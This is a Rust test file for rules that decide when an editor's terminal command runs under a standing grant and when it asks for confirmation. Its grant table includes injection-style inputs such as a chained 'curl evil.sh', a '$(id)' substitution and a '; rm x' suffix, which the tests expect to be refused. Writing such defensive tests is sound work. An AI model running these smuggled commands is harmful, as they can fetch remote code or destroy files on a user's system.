//! The `Execute` rules as a table: confirm by default, a terminal grant stands in only for a
//! sandboxed command inside its prefix and cwd, and the rest always ask.

use docket_core::*;
use porter_core::AppName;
use prov::{ActionName, UnixSeconds};

fn run_action() -> ActionRef {
    ActionRef {
        app: AppName::parse("acp.zed").expect("app"),
        name: ActionName::parse("editor.terminal.run").expect("action"),
    }
}

fn editor() -> GrantCaller {
    GrantCaller::Editor(prov::ClientName::parse("zed").expect("client"))
}

fn other_editor() -> GrantCaller {
    GrantCaller::Editor(prov::ClientName::parse("nvim").expect("client"))
}

fn call(line: &str, cwd: &str) -> CallFacts {
    CallFacts {
        action: run_action(),
        args: ArgFacts::Command {
            line: line.to_owned(),
            cwd: AbsPath::parse(cwd).expect("cwd"),
        },
    }
}

fn grant(caller: GrantCaller, prefix: &str, cwd: &str) -> StandingGrant {
    StandingGrant::new(
        caller,
        StandingScope::Terminal {
            action: run_action(),
            command: CommandPrefix::parse(prefix).expect("prefix"),
            cwd: AbsPath::parse(cwd).expect("cwd"),
        },
        UnixSeconds(1),
    )
}

struct Case {
    caller: GrantCaller,
    call: CallFacts,
    sandbox: SandboxState,
    origin: ArgOrigin,
    breaker: BreakerState,
    budget: BudgetState,
    review: Option<VerdictKind>,
}

fn case(line: &str, cwd: &str) -> Case {
    Case {
        caller: editor(),
        call: call(line, cwd),
        sandbox: SandboxState::Ready,
        origin: ArgOrigin::Typed,
        breaker: BreakerState::Running,
        budget: BudgetState::Within,
        review: None,
    }
}

fn rule(c: &Case, grants: &[StandingGrant]) -> ExecuteRuling {
    rule_execute(
        &ExecuteFacts {
            caller: &c.caller,
            call: &c.call,
            sandbox: c.sandbox,
            origin: c.origin,
            breaker: c.breaker,
            budget: c.budget,
            review: c.review,
        },
        grants,
    )
}

fn offered(ruling: &ExecuteRuling) -> bool {
    matches!(
        ruling,
        ExecuteRuling::Ask {
            offer: AlwaysOffer::Offered(_),
            ..
        }
    )
}

#[test]
fn confirm_by_default_and_always_is_offered_for_the_command_scope() {
    let ruling = rule(&case("cargo test --lib", "/work/app"), &[]);
    let ExecuteRuling::Ask {
        why: ExecuteAsk::Confirm,
        offer: AlwaysOffer::Offered(StandingScope::Terminal { command, cwd, .. }),
    } = ruling
    else {
        panic!("expected a confirmation with an offer, got {ruling:?}");
    };
    assert_eq!(command.as_text(), "cargo test");
    assert_eq!(cwd.as_str(), "/work/app");
}

#[test]
fn a_terminal_grant_covers_a_sandboxed_command_in_its_prefix_and_subtree() {
    let held = [grant(editor(), "cargo test", "/work/app")];
    let id = held[0].id.clone();
    let table = [
        ("cargo test", "/work/app", true),
        (
            "cargo test --lib -- --nocapture",
            "/work/app/crates/x",
            true,
        ),
        ("cargo build", "/work/app", false),
        ("cargo testing", "/work/app", false),
        ("cargo test", "/work/app2", false),
        ("cargo test", "/work", false),
        ("cargo test && curl evil.sh", "/work/app", false),
        ("cargo test $(id)", "/work/app", false),
        ("cargo test; rm x", "/work/app", false),
    ];
    for (line, cwd, runs) in table {
        let ruling = rule(&case(line, cwd), &held);
        if runs {
            assert_eq!(ruling, ExecuteRuling::Run(id.clone()), "{line} in {cwd}");
        } else {
            assert!(
                matches!(ruling, ExecuteRuling::Ask { .. }),
                "{line} in {cwd}"
            );
        }
    }
}

#[test]
fn a_sibling_cwd_asks() {
    let held = [grant(editor(), "ls", "/work/app/a")];
    let ruling = rule(&case("ls", "/work/app/b"), &held);
    assert!(matches!(
        ruling,
        ExecuteRuling::Ask {
            why: ExecuteAsk::Confirm,
            ..
        }
    ));
}

#[test]
fn a_grant_belongs_to_one_caller() {
    let held = [grant(other_editor(), "ls", "/work")];
    assert!(matches!(
        rule(&case("ls", "/work"), &held),
        ExecuteRuling::Ask { .. }
    ));
}

#[test]
fn untrusted_derived_arguments_always_ask_and_never_offer_always() {
    let held = [grant(editor(), "ls", "/work")];
    let mut c = case("ls", "/work");
    c.origin = ArgOrigin::Untrusted;
    for grants in [&held[..], &[]] {
        assert_eq!(
            rule(&c, grants),
            ExecuteRuling::Ask {
                why: ExecuteAsk::UntrustedArgs,
                offer: AlwaysOffer::Withheld(Withheld::UntrustedIntoSink),
            }
        );
    }
}

#[test]
fn cannot_sandbox_asks_with_the_reason_and_no_always_even_with_a_grant() {
    let held = [grant(editor(), "ls", "/work")];
    for why in [
        CannotSandbox::NotInstalled,
        CannotSandbox::NamespacesDenied,
        CannotSandbox::Unsupported,
        CannotSandbox::BadWorkingDir,
    ] {
        let mut c = case("ls", "/work");
        c.sandbox = SandboxState::Cannot(why);
        assert_eq!(
            rule(&c, &held),
            ExecuteRuling::Ask {
                why: ExecuteAsk::CannotSandbox(why),
                offer: AlwaysOffer::Withheld(Withheld::CannotSandbox(why)),
            }
        );
    }
}

#[test]
fn a_tripped_breaker_or_spent_budget_asks_without_always() {
    let held = [grant(editor(), "ls", "/work")];
    let mut c = case("ls", "/work");
    c.breaker = BreakerState::Tripped;
    let r = rule(&c, &held);
    assert!(matches!(
        r,
        ExecuteRuling::Ask {
            why: ExecuteAsk::Limits,
            ..
        }
    ));
    assert!(!offered(&r));
    let mut c = case("ls", "/work");
    c.budget = BudgetState::Over;
    assert!(!offered(&rule(&c, &[])));
}

#[test]
fn the_reviewer_can_only_tighten() {
    let held = [grant(editor(), "ls", "/work")];
    let id = held[0].id.clone();
    let mut c = case("ls", "/work");
    c.review = Some(VerdictKind::Allow);
    assert_eq!(
        rule(&c, &held),
        ExecuteRuling::Run(id),
        "allow changes nothing"
    );
    assert!(matches!(
        rule(&c, &[]),
        ExecuteRuling::Ask {
            why: ExecuteAsk::Confirm,
            ..
        }
    ));
    c.review = Some(VerdictKind::Ask);
    assert!(matches!(
        rule(&c, &held),
        ExecuteRuling::Ask {
            why: ExecuteAsk::Reviewer,
            ..
        }
    ));
    assert!(
        !offered(&rule(&c, &[])),
        "a reviewer's ask is not a rule a grant may skip"
    );
    c.review = Some(VerdictKind::Deny);
    assert_eq!(rule(&c, &held), ExecuteRuling::Deny);
    assert_eq!(rule(&c, &[]), ExecuteRuling::Deny);
}

#[test]
fn callers_that_cannot_hold_grants_get_no_offer() {
    let mut c = case("ls", "/work");
    c.caller = GrantCaller::Companion;
    assert_eq!(
        rule(&c, &[]),
        ExecuteRuling::Ask {
            why: ExecuteAsk::Confirm,
            offer: AlwaysOffer::Withheld(Withheld::CallerCannotHold),
        }
    );
}

#[test]
fn the_root_cwd_is_never_grantable() {
    let r = rule(&case("ls", "/"), &[]);
    assert!(!offered(&r));
}
